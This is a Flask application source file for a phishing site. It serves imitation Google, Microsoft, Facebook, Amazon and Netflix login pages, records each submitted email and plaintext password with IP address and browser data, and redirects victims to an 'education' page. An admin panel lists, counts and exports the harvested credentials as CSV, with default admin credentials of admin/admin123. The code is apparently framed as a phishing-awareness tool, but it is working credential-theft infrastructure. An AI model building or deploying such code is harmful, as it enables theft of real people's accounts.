from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import datetime
import os
import json
import sys
import subprocess
import time
from dotenv import load_dotenv
import asyncio
from functools import wraps

# Load environment variables
load_dotenv()

# Apply nest_asyncio for better asyncio support
try:
    import nest_asyncio
    nest_asyncio.apply()
except ImportError:
    print("Warning: nest_asyncio not available")

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'fallback-secret-key-change-in-production')

# Global variable to track Prisma initialization status
prisma_initialized = False
db = None

def async_route(f):
    """Decorator to handle async routes in Flask"""
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs))
    return wrapper

async def initialize_prisma():
    """Initialize Prisma client once per process"""
    global prisma_initialized, db
    
    if prisma_initialized:
        return
    
    # Attempt to import and initialize Prisma
    try:
        from prisma import Prisma
        db = Prisma()
        prisma_initialized = True
        print("Prisma client initialized successfully")
    except ImportError:
        print("Prisma client not found, attempting to generate...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "prisma==0.11.0", "--upgrade"])
            subprocess.check_call([sys.executable, "-m", "prisma", "generate"])
            from prisma import Prisma
            db = Prisma()
            prisma_initialized = True
            print("Prisma client generated and initialized successfully.")
        except Exception as e:
            print(f"Error generating Prisma client: {e}")
            raise

async def ensure_connected():
    """Ensure database is connected with retry logic"""
    global db
    
    # Make sure Prisma is initialized
    await initialize_prisma()
    
    # Connect to database
    max_retries = 5
    backoff_factor = 1.5
    
    for attempt in range(max_retries):
        try:
            # Always disconnect first in serverless environment to avoid connection issues
            try:
                if db and db.is_connected():
                    await db.disconnect()
            except Exception as e:
                print(f"Disconnect error (non-critical): {e}")
                
            # Check if DATABASE_URL is set
            db_url = os.getenv('DATABASE_URL')
            if not db_url:
                raise Exception("DATABASE_URL environment variable is not set")
                
            # Connect with timeout
            print(f"Connecting to database (attempt {attempt + 1}/{max_retries})...")
            await asyncio.wait_for(db.connect(), timeout=10.0)
            print(f"Database connected successfully on attempt {attempt + 1}")
            return
        except Exception as e:
            print(f"Database connection attempt {attempt + 1} failed: {e}")
            if attempt == max_retries - 1:
                raise
            
            # Exponential backoff
            sleep_time = backoff_factor ** attempt
            print(f"Retrying in {sleep_time:.2f} seconds...")
            await asyncio.sleep(sleep_time)

async def get_stats():
    """Calculate real statistics from database"""
    global db
    
    try:
        await ensure_connected()
        
        # Get total attempts
        total_attempts = await db.capture.count()
        
        # Get unique IPs
        unique_ips_result = await db.query_raw(
            "SELECT COUNT(DISTINCT ip) as count FROM captures"
        )
        unique_ips = unique_ips_result[0]['count'] if unique_ips_result else 0
        
        # Get today's attempts
        today = datetime.datetime.now().date()
        today_attempts = await db.capture.count(
            where={
                'timestamp': {
                    'gte': datetime.datetime.combine(today, datetime.time.min),
                    'lte': datetime.datetime.combine(today, datetime.time.max)
                }
            }
        )
        
        stats = {
            'total_attempts': total_attempts,
            'success_rate': 100 if total_attempts > 0 else 0,
            'unique_ips': unique_ips,
            'today_attempts': today_attempts
        }
        
        return stats
        
    except Exception as e:
        print(f"Error calculating stats: {e}")
        return {
            'total_attempts': 0,
            'success_rate': 0,
            'unique_ips': 0,
            'today_attempts': 0
        }

@app.route('/', methods=['GET', 'POST'])
@async_route
async def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        browser_data = request.form.get('browserData', '')
        ip = request.remote_addr or 'unknown'
        
        # Parse browser data if available
        user_agent = ''
        if browser_data:
            try:
                browser_info = json.loads(browser_data)
                user_agent = browser_info.get('userAgent', '')
            except:
                pass
        
        # Save to database
        try:
            await ensure_connected()
            await db.capture.create(
                data={
                    'email': email,
                    'password': password,
                    'ip': ip,
                    'userAgent': user_agent,
                    'template': 'google'
                }
            )
        except Exception as e:
            print(f"Error saving capture: {e}")
        
        return redirect(url_for('education'))
    
    return render_template('login.html')

@app.route('/education')
def education():
    return render_template('education.html')

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        admin_username = os.getenv('ADMIN_USERNAME', 'admin')
        admin_password = os.getenv('ADMIN_PASSWORD', 'admin123')
        
        if username == admin_username and password == admin_password:
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            error = 'Invalid credentials'
    return render_template('admin_login.html', error=error)

@app.route('/admin')
@async_route
async def admin():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    try:
        await ensure_connected()
        
        # Get all captures ordered by newest first
        captures = await db.capture.find_many(
            order={
                'timestamp': 'desc'
            }
        )
        
        # Format data for template
        data = []
        for capture in captures:
            user_agent = capture.userAgent or 'Unknown'
            # Truncate long user agents for display
            if len(user_agent) > 50:
                user_agent = user_agent[:50] + '...'
            
            data.append([
                capture.email,
                capture.password,
                capture.ip,
                capture.timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                user_agent
            ])
        
        # Get statistics
        stats = await get_stats()
        
        return render_template('admin.html', data=data, stats=stats)
        
    except Exception as e:
        print(f"Error loading admin data: {e}")
        return render_template('admin.html', data=[], stats={
            'total_attempts': 0,
            'success_rate': 0,
            'unique_ips': 0,
            'today_attempts': 0
        })

@app.route('/admin/clear_data', methods=['POST'])
@async_route
async def clear_data():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    try:
        await ensure_connected()
        await db.capture.delete_many()
        print("All capture data cleared")
    except Exception as e:
        print(f"Error clearing data: {e}")
    
    return redirect(url_for('admin'))

@app.route('/admin/export')
@async_route
async def export_data():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    try:
        await ensure_connected()
        
        captures = await db.capture.find_many(
            order={
                'timestamp': 'desc'
            }
        )
        
        # Create CSV data
        csv_data = "Email,Password,IP Address,Timestamp,User Agent,Template\n"
        for capture in captures:
            csv_data += f'"{capture.email}","{capture.password}","{capture.ip}","{capture.timestamp}","{capture.userAgent or "Unknown"}","{capture.template or "Unknown"}"\n'
        
        response = app.response_class(
            csv_data,
            mimetype='text/csv',
            headers={
                'Content-Disposition': f'attachment; filename=phishing_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
            }
        )
        return response
        
    except Exception as e:
        print(f"Error exporting data: {e}")
        return redirect(url_for('admin'))

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/template/<template_name>', methods=['GET', 'POST'])
@async_route
async def phishing_template(template_name):
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        browser_data = request.form.get('browserData', '')
        ip = request.remote_addr or 'unknown'
        
        # Parse browser data if available
        user_agent = ''
        if browser_data:
            try:
                browser_info = json.loads(browser_data)
                user_agent = browser_info.get('userAgent', '')
            except:
                pass
        
        # Save to database
        try:
            await ensure_connected()
            await db.capture.create(
                data={
                    'email': email,
                    'password': password,
                    'ip': ip,
                    'userAgent': user_agent,
                    'template': template_name
                }
            )
        except Exception as e:
            print(f"Error saving capture: {e}")
        
        return redirect(url_for('education'))
    
    templates = {
        'google': 'login.html',
        'microsoft': 'microsoft_login.html',
        'facebook': 'facebook_login.html',
        'amazon': 'amazon_login.html',
        'netflix': 'netflix_login.html'
    }
    
    if template_name in templates:
        return render_template(templates[template_name])
    else:
        return redirect(url_for('login'))

@app.route('/api/stats')
@async_route
async def api_stats():
    """API endpoint for live statistics"""
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    stats = await get_stats()
    return jsonify(stats)

# Health check for Vercel
@app.route('/health')
@async_route
async def health():
    start_time = time.time()
    db_status = "not_checked"
    db_error = None
    
    try:
        # Initialize Prisma without full connection
        await initialize_prisma()
        init_status = "success" if prisma_initialized else "failed"
        
        # Try to connect to the database
        try:
            await ensure_connected()
            db_status = "connected"
        except Exception as e:
            db_status = "error"
            db_error = str(e)
    except Exception as e:
        init_status = "error"
        db_error = str(e)
    
    # Get environment variables (with sensitive parts masked)
    env_vars = {}
    for key in ['VERCEL_ENV', 'VERCEL_REGION', 'PYTHON_VERSION', 'NODE_VERSION']:
        env_vars[key] = os.environ.get(key, 'not set')
        
    # Check DATABASE_URL (but don't reveal password)
    db_url = os.environ.get('DATABASE_URL', 'not set')
    if db_url != 'not set':
        # Replace password with asterisks
        import re
        try:
            masked_url = re.sub(r'(postgresql://[^:]+:)[^@]+(@.+)', r'\1*****\2', db_url)
            env_vars['DATABASE_URL'] = masked_url
        except:
            env_vars['DATABASE_URL'] = "present but invalid format"
    
    # Check other environment variables existence
    for key in ['SECRET_KEY', 'ADMIN_USERNAME', 'ADMIN_PASSWORD']:
        env_vars[f"{key}_set"] = 'yes' if os.environ.get(key) else 'no'
    
    response_time = time.time() - start_time
    
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.datetime.now().isoformat(),
        'response_time_ms': round(response_time * 1000, 2),
        'prisma_init': init_status,
        'database_status': db_status,
        'database_error': db_error,
        'python_version': '.'.join(map(str, sys.version_info[:3])),
        'environment': env_vars
    })

# Export the Flask app for Vercel
application = app

if __name__ == '__main__':
    app.run(debug=True)
